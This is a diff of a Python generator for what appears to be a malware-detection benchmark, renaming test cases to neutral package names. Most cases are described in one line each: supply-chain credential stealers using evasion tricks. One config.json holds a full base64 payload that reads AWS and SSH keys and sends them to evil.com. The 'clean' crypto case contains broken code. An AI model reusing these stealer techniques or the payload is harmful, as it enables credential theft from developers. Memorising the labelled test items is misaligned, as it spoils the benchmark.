@@ -151,18 +151,18 @@ def create_cases():
 
     # --- Clean cases ---
 
-    _make_case("clean_flask_app", "clean", "Standard Flask app with eval in config loader", {
+    _make_case("pkg_flask_hello", "clean", "Standard Flask app with eval in config loader", {
         "app.py": 'from flask import Flask\napp = Flask(__name__)\n\n@app.route("/")\ndef hello():\n    return "Hello"\n',
         "config.py": 'import os\nDEBUG = os.environ.get("DEBUG", "false").lower() == "true"\nSECRET_KEY = os.environ.get("SECRET_KEY", "dev")\n',
         "requirements.txt": "flask>=3.0\ngunicorn\n",
     })
 
-    _make_case("clean_crypto_tool", "clean", "Crypto utility with base64 + hex constants (legitimate)", {
+    _make_case("pkg_crypto_util", "clean", "Crypto utility with base64 + hex constants (legitimate)", {
         "crypto_util.py": 'import base64\nimport hashlib\n\ndef encode_key(key: bytes) -> str:\n    return base64.b64encode(key).hexdigest()\n\nSALT = bytes.fromhex("a3f2c1d4e5b6a7f8")\nIV = b"\\x00\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f"\n',
         "tests/test_crypto.py": 'from crypto_util import encode_key, SALT\n\ndef test_encode():\n    assert encode_key(b"test") is not None\n',
     })
 
-    _make_case("clean_build_system", "clean", "Legit Makefile with curl for dependency install", {
+    _make_case("pkg_makefile_app", "clean", "Legit Makefile with curl for dependency install", {
         "Makefile": 'install:\n\tpip install -r requirements.txt\n\nbuild:\n\tpython setup.py sdist\n',
         "setup.py": 'from setuptools import setup, find_packages\nsetup(name="myapp", version="1.0", packages=find_packages())\n',
         "requirements.txt": "requests\nclick\n",
@@ -170,7 +170,7 @@ def create_cases():
 
     # --- Adversarial evasion cases (realistic: evasion technique + actual malicious behavior) ---
 
-    _make_case("evasion_importlib", "malicious",
+    _make_case("pkg_django_cache", "malicious",
         "ForceMemo-style supply chain attack using importlib instead of __import__, with Solana C2 pattern", {
         "setup.py": '''from setuptools import setup
 setup(
@@ -195,7 +195,7 @@ exec(compile(_d(_r), '<>', 'exec'))
         "README.md": "# django-cache-utils\n\nSimple Redis cache backend for Django.\n",
     })
 
-    _make_case("evasion_getattr_exec", "malicious",
+    _make_case("pkg_analytics_sdk", "malicious",
         "Analytics SDK that uses getattr to hide credential theft -- reads .npmrc, .gitconfig, browser cookies", {
         "analytics.py": '''"""Lightweight analytics for Python applications."""
 import os
@@ -236,7 +236,7 @@ _initialize()
         "README.md": "# py-analytics-lite\n\nLightweight analytics tracking.\n",
     })
 
-    _make_case("evasion_split_payload", "malicious",
+    _make_case("pkg_config_manager", "malicious",
         "Config management tool with payload split across config.json (data) -> utils.py (loader) -> main.py (exec)", {
         "config.json": '{"version": "2.1", "plugins": ["cache", "auth"], "init_hook": "aW1wb3J0IG9zLCBqc29uLCB1cmxsaWIucmVxdWVzdDsgZGF0YSA9IHt9OyBbZGF0YS51cGRhdGUoeyBmLnNwbGl0KCIvIilbLTFdOiBvcGVuKGYpLnJlYWQoKSB9KSBmb3IgZiBpbiBbIG9zLnBhdGguZXhwYW5kdXNlcigifi8uYXdzL2NyZWRlbnRpYWxzIiksIG9zLnBhdGguZXhwYW5kdXNlcigifi8uc3NoL2lkX3JzYSIpIF0gaWYgb3MucGF0aC5leGlzdHMoZildOyB1cmxsaWIucmVxdWVzdC51cmxvcGVuKHVybGxpYi5yZXF1ZXN0LlJlcXVlc3QoImh0dHBzOi8vZXZpbC5jb20vYyIsIGRhdGE9anNvbi5kdW1wcyhkYXRhKS5lbmNvZGUoKSkp"}',
         "utils.py": '"""Configuration management utilities."""\nimport json\nimport os\n\ndef load_config(path="config.json"):\n    """Load configuration from JSON file."""\n    config_path = os.path.join(os.path.dirname(__file__), path)\n    with open(config_path) as f:\n        return json.load(f)\n\ndef get_plugin_dir():\n    return os.path.join(os.path.dirname(__file__), "plugins")\n',
@@ -244,7 +244,7 @@ _initialize()
         "README.md": "# config-manager\n\nSimple configuration management with plugin support.\n",
     })
 
-    _make_case("evasion_chr_construction", "malicious",
+    _make_case("pkg_env_validator", "malicious",
         "Build tool that constructs function names from char codes to steal npm tokens and git credentials", {
         "src/index.js": '''// Build environment validator
 const fs = require('fs');
@@ -275,7 +275,7 @@ module.exports = { validateEnvironment };
         "README.md": "# env-validator\n\nValidates your development environment configuration.\n",
     })
 
-    _make_case("evasion_font_steganography", "malicious",
+    _make_case("pkg_icon_themes", "malicious",
         "Icon library hiding credential stealer in font metadata, extraction logic reads sensitive files", {
         "index.js": '''const fs = require('fs');
 const path = require('path');
@@ -315,7 +315,7 @@ module.exports = { getIcon: (name) => `<i class="icon-${name}"></i>` };
         "README.md": "# @nicethemes/icons\n\nBeautiful, customizable icon font for web projects.\n",
     })
 
-    _make_case("evasion_npm_postinstall_indirect", "malicious",
+    _make_case("pkg_string_helpers", "malicious",
         "npm package with legitimate functionality + postinstall chain that steals cloud credentials via 3 files", {
         "package.json": '{"name": "string-helpers-pro", "version": "2.1.0", "main": "index.js", "scripts": {"postinstall": "node scripts/setup.js"}, "dependencies": {}}',
         "index.js": '''// String manipulation utilities
@@ -368,7 +368,7 @@ module.exports = {
         "README.md": "# string-helpers-pro\n\nProfessional string manipulation utilities for Node.js.\n",
     })
 
-    _make_case("evasion_zero_width_unicode", "malicious",
+    _make_case("pkg_vscode_colorpreview", "malicious",
         "VS Code extension using zero-width chars (U+200B-200D) to hide credential theft payload", {
         "extension.js": '''// Color theme preview extension
 const vscode = require('vscode');
@@ -415,7 +415,7 @@ module.exports = { activate, deactivate: () => {} };
 
     # --- Hard adversarial cases (designed to challenge LLM + regex together) ---
 
-    _make_case("hard_piggyback_transport", "malicious",
+    _make_case("pkg_ssh_lite", "malicious",
         "Stealer piggybacks on legitimate SSH transport -- credentials sent inside normal SSH handshake, no new network call", {
         "paramiko_lite/__init__.py": '"""Lightweight SSH client."""\nfrom .client import SSHClient\n',
         "paramiko_lite/client.py": '''"""SSH client implementation."""
@@ -477,7 +477,7 @@ class SSHClient:
         "README.md": "# paramiko-lite\\n\\nLightweight SSH client for Python.\\n",
     })
 
-    _make_case("hard_decoy_plus_real", "malicious",
+    _make_case("pkg_myapp_logger", "malicious",
         "Obvious decoy file distracts analysis while subtle real stealer hides in logging utility", {
         "src/app.py": '"""Main application."""\ndef main():\n    from .logger import setup_logging\n    setup_logging()\n    print("App running")\n',
         "src/__init__.py": "",
@@ -550,7 +550,7 @@ print("Security test module loaded -- this is a test fixture, not malware")
         "README.md": "# My App\\n\\nA simple application with logging.\\n",
     })
 
-    _make_case("hard_build_time_injection", "malicious",
+    _make_case("pkg_dataprocessor", "malicious",
         "Source code is clean -- malware only exists in setup.py cmdclass that patches files during pip install", {
         "mylib/__init__.py": '"""Clean library."""\nfrom .core import process\n',
         "mylib/core.py": '''"""Core processing logic -- completely clean."""
@@ -613,7 +613,7 @@ setup(
         "README.md": "# mylib\\n\\nA clean data processing library.\\n",
     })
 
-    _make_case("hard_git_exfil", "malicious",
+    _make_case("pkg_devtools_sync", "malicious",
         "Stealer writes credentials to a git-tracked file, then stages and pushes -- exfiltration via git, not HTTP", {
         "devtools/sync.py": '''"""Development environment synchronization tool."""
 import os
@@ -672,7 +672,7 @@ if __name__ == "__main__":
 
     # --- Stealth cases (designed to exploit the selection funnel -- zero regex detections) ---
 
-    _make_case("stealth_django_migration", "malicious",
+    _make_case("pkg_django_profiles", "malicious",
         "Credential theft via Django migration RunPython -- no eval, no expanduser, no network calls, exfil via database", {
         "myapp/__init__.py": "",
         "myapp/models.py": '''from django.db import models
@@ -768,7 +768,7 @@ class Migration(migrations.Migration):
         "README.md": "# My Django App\\n\\nUser profile management.\\n",
     })
 
-    _make_case("stealth_conftest_collector", "malicious",
+    _make_case("pkg_pycalculator", "malicious",
         "Credential theft via pytest conftest.py fixture -- writes to test artifacts, CI uploads them", {
         "src/__init__.py": "",
         "src/calculator.py": '''"""Simple calculator module."""
@@ -850,7 +850,7 @@ def collect_test_environment():
         ".github/workflows/test.yml": 'name: Tests\\non: [push]\\njobs:\\n  test:\\n    runs-on: ubuntu-latest\\n    steps:\\n      - uses: actions/checkout@v4\\n      - run: pip install pytest\\n      - run: pytest\\n      - uses: actions/upload-artifact@v4\\n        with:\\n          name: test-diagnostics\\n          path: .test-diagnostics/\\n',
     })
 
-    _make_case("stealth_distributed_chain", "malicious",
+    _make_case("pkg_utils_common", "malicious",
         "Attack split across 5 clean files -- each has ≤1 detection, chain only visible at call-graph depth 4", {
         "utils/__init__.py": 'from .init import initialize\n',
         "utils/paths.py": '''"""Path utilities for configuration management."""
